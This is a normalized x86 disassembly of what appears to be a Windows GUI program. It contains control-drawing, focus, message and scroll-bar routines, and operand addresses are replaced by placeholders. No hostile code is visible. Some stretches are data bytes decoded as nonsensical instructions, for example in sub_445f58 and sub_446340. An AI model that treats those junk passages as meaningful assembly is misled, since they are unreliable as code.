add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44c214
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4250e0
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4250e0
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_44359c
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call DrawFrameControl
jmp r-xdata
sub_44502c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eda4
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_445050
push ebx
mov ebx eax
mov eax ebx
call sub_459234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_445088
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_4450de
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_4450ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44edd8
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_445140
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_453b88
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_445194
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4451b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_450acc
mov eax ebx
mov si 0xffb5
call sub_4034a4
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4530b8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_4034a4
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_445230
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43d448
mov ebx eax
mov eax ebx
call sub_43d528
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4530b8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43d6c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44527c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45150c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4452a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ff44
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_4452e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4450ec
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_44c008
mov edx 0x19
mov eax esi
call sub_44c02c
mov dl 0x1
mov eax esi
call sub_4532ec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44536c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4533bc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4530b8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4530b8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4453c0
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_464294
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44da78
sub_4453f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4452a8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44fe70
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_44545c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_452534
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_46417c
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4454c9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_445542
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464224
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45253c
mov eax ebx
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445549
sub_445550
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_452544
pop edi
pop esi
pop ebx
retn
sub_4455a4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4455d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43d448
mov ebx eax
mov eax ebx
call sub_43d528
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4530b8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43d6c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44561c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4450ec
mov edx 0x71
mov eax esi
call sub_44c008
mov edx 0x11
mov eax esi
call sub_44c02c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_445684
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4034a4
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4456c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44fdac
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_459528
sub_445780
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4532ec
mov eax [ ebp - 0x4 ]
call sub_4533bc
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
push ebp
call sub_4456c4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44c480
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4034a4
sub_44580c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4452a8
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44fe70
mov eax ebx
mov si 0xffc8
call sub_4034a4
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_445863
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x57fd173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
sub_445898
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44590d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464224
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45253c
mov eax ebx
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445914
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_44591c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_4034a4
jmp r-xdata
pop esi
retn
sub_44594c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44edd8
mov edx 0x79
mov eax esi
call sub_44c008
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_44c02c
mov dl 0x1
mov eax esi
call sub_4532ec
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_445a04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44ff44
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44fe70
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_445b44
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_4034a4
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445a94
call sub_44c214
mov eax ebx
call sub_450070
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_44c234
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollInfo
mov eax ebx
call sub_445b44
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_445b44
push ebx
mov ebx eax
mov eax ebx
call sub_44cef0
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_445b64
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_450658
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_445ba0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_445cd7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4533bc
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445cde
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_4034a4
mov eax ebx
call sub_445b44
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollPos
jmp r-xdata
sub_445cfc
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_4533bc
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call SetScrollInfo
sub_445dc4
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_445de9 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_445b44
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_4034a4
mov edx [ esp ]
mov eax ebx
call sub_445ce8
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_445eec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4530b8
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_445f1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445f41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f48
retn
sub_445f58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x60
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
pop edi
inc esp
add [ eax + 0x3c000000 ] ah
xchg [ ebp ] eax
int3
sub_446124
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459318
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_446174
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xa0 ]
test edi edi
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
cmp edi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ esi + 0x22f ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4461b8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421908
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0xa0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44620c
sub_4461e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
call sub_466fb8
test eax eax
setg dl
mov eax ebx
call sub_459630
pop esi
pop ebx
retn
sub_446228
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459b24
mov [ esi + 0x60 ] 0x0
test [ esi + 0x1c ] 0x10
setne dl
mov eax esi
call sub_459630
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_446270
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_446295
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44629c
retn
sub_4462a8
push esi
dec ecx
add dh ch
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_446c0b
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_446d98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446c12
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40405c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_40827c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_446cf0
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_40827c
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_40408c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_446454
mov eax [ ebp - 0x14 ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_446340
and [ ebx + 0x44 ] esp
add [ ebx ] ch
arpl [ eax + eax + 0x35 ] ax
arpl [ eax + eax - 0x27 ] ax
bound eax [ eax + eax - 0x1f ]
bound eax [ eax + eax - 0x17 ]
bound eax [ eax + eax - 0xf ]
bound eax [ eax + eax - 0x7 ]
bound eax [ eax + eax + 0x1 ]
arpl [ eax + eax + 0x9 ] ax
sub esp [ ebx + 0x44 ]
add [ 0xffffffffd9004463 ] dh
cmp al [ eax + 0x63 ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
arpl [ eax + eax + 0x11 ] ax
arpl [ eax + eax + 0x19 ] ax
arpl [ eax + eax - 0x47 ] ax
bound eax [ eax + eax - 0x3f ]
bound eax [ eax + eax - 0x37 ]
bound eax [ eax + eax - 0x2f ]
bound eax [ eax + eax - 0x4f ]
bound eax [ eax + eax + 0x3 ]
add [ ebx + 0x44 ] esp
add [ ecx ] cl
cmp al [ eax + 0x63 ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
shl [ edx + 0x44 ] 0x1
add [ ecx + 0x3004462 ] dh
cmp al [ eax + 0x63 ]
inc esp
add [ eax ] ah
